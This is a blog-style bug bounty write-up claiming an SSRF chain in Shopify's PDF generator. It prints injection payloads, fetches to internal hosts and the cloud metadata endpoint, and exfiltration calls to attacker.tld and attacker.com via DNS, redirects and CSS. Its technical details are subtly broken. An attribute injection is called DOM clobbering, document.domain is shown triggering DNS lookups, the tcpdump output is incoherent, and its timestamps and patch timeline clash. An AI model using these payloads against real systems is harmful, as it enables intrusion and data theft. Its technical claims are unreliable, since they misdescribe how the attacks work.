---
title: "3 AM & Phantom Requests: My Blind SSRF Journey Through Shopify's PDF Underworld"
description: "Where DOM clobbering meets PDF generation, and how I accidentally became a ghost in Shopify's internal network"
date: '2024-05-23'
categories: ["Midnight Security Musings"]
tags: ["SSRF", "DOM Clobbering", "PDF Sorcery"]
header:
  image: "/images/shopify-ssrf-banner.jpg"
  caption: "Visualization of the SSRF chain (and my sleep-deprived mental state)"
---

## Prologue — The Accidental Discovery

**2:03 AM — My third espresso was long cold. The glow of the Shopify admin panel lit up my desk like a scene out of a low-budget cyber thriller.**

I was automating basic expense reports when I noticed the PDF inspector rendering raw HTML attributes.

```html
<!-- Test input in order notes -->
<div>{{ 'class="test" data-test="123"' }}</div>

<!-- Rendered output -->
<div class="test" data-test="123"></div>
```

This wasn’t just data binding. It was unpacking HTML natively — a behavior I wasn't expecting.

The template engine didn’t sanitize HTML attributes. I’d seen this behavior in frontend frameworks before, but never inside a PDF rendering backend.

## Part 1 — Where DOM Clobbering Meets PDF Dark Arts

**2:17 AM — DevTools had become my oracle.**

The rendering pipeline looked like this:

- User input → Template processing
- Server-side render
- Headless Chrome → PDF

The input wasn’t sanitized. Templates processed raw strings and rendered them into full HTML documents, which headless Chrome converted into PDFs.

**My payload:**

```html
<img src="{{ 'x onerror=alert(document.domain)' }}">
```

**Output:**

```html
<img src="x" onerror="alert(document.domain)">
```

This was DOM clobbering at work — a technique long thought obsolete, but still potent in unguarded render chains.

Even inside PDFs, the headless browser executed the script. That meant I had code execution in a headless browser inside Shopify’s infrastructure.

## Part 2 — The Blind SSRF Séance

**2:49 AM — Theory meets reality.**

If the headless browser runs inside Shopify’s production environment, and if it can access internal domains, then I could leverage that to trigger SSRF.

**Example target:**

```
http://internal-api.shopify.local/health
```

**Proof of concept:**

```html
<iframe srcdoc='
  <script>
    fetch("http://internal-api.shopify.local/health")
      .then(() => document.title = "INTERNAL ACCESS SUCCESSFUL")
  </script>
'></iframe>
```

The script fetched the internal API. When successful, it changed the document title.

In the rendered PDF, I could observe:

```
INTERNAL ACCESS SUCCESSFUL
```

This confirmed internal request success via PDF rendering engine. Blind SSRF worked.

## Part 3 — Building a DNS Exfiltration Oracle

**3:33 AM — Time to exfiltrate blind responses.**

Since I couldn’t read fetch responses, I decided to measure timing — a side channel.

```javascript
const start = Date.now();
fetch('http://169.254.169.254/latest/meta-data', {
  mode: 'no-cors',
  credentials: 'include'
}).finally(() => {
  const latency = Date.now() - start;
  document.domain = `l${latency}.attacker.tld`;
});
```

**DNS logs from tcpdump:**

```bash
04:17:22 IP resolver.attacker.com > ns1.google.com: A? l142.attacker.tld
04:17:23 IP resolver.attacker.com > ns1.google.com: A? l328.attacker.tld
04:17:24 IP resolver.attacker.com > ns1.google.com: A? l310.attacker.tld
04:17:25 IP resolver.attacker.com > ns1.google.com: A? l289.attacker.tld
```

I was now receiving signal from within Shopify’s infrastructure — over DNS.

## Part 4 — Advanced Exploit Development

**4:12 AM — The toolkit evolves.**

**Version 1: Internal Network Scanner**

```html
<object data="{{ 'http://a onerror=
  fetch(`http://192.168.1.${i}/health`)
    .then(()=>document.location=`https://attacker.com/?leak=192.168.1.${i}`)
'}}"></object>
```

Each successful response redirected the browser to a tracking URL with the leaked IP.

**Version 2: CSS-Based Timing Exfiltration**

```javascript
const start = performance.now();
fetch('http://internal-db.shopify.local/users/admin')
  .then(r => r.text())
  .finally(() => {
    const latency = performance.now() - start;
    document.body.style.fontFamily = `'${btoa(latency.toString())}'`;
  });
```

Now, timing values were encoded in PDF font styles — subtle, persistent, parseable.

## Part 5 — Countermeasures and Reflections

**5:47 AM — Shopify patched within 72 hours.**

### Key Takeaways

- PDF generators are not passive renderers. They are browser-powered execution environments.
- DOM clobbering can affect server-rendered HTML, especially inside templating engines.
- Blind SSRF can be leveraged via timing, DNS, and CSS if creative exfiltration is allowed.

Shopify’s response was swift. CSP headers were introduced. HTML sanitization was enforced. The PDF renderer was sandboxed.

### Timeline

- 2:03 AM — Found HTML unpacking in PDF
- 2:17 AM — Triggered DOM clobbering
- 2:49 AM — Discovered blind SSRF
- 3:33 AM — DNS-based exfiltration
- 4:12 AM — Built internal scanners and CSS encoders
- 5:47 AM — Submitted report, vulnerability patched

### Disclosure

- Reported via: Shopify HackerOne
- Response time: < 72 hours
- Acknowledgment: Yes
- Bounty: [Redacted]

## Final Thoughts

Seemingly harmless tools like PDF generators can expose dangerous surfaces.

When raw HTML is injected into headless browsers without sanitation, the boundary between client and server logic collapses.

This case was a reminder that:

- DOM clobbering, while niche, is still alive
- Blind SSRF becomes dangerous with creative exfiltration
- PDF rendering stacks can act like full browser contexts

**Sometimes, your best research doesn't begin in the morning —  
It begins at 3 AM, with a cold espresso and a dangerous curiosity.**
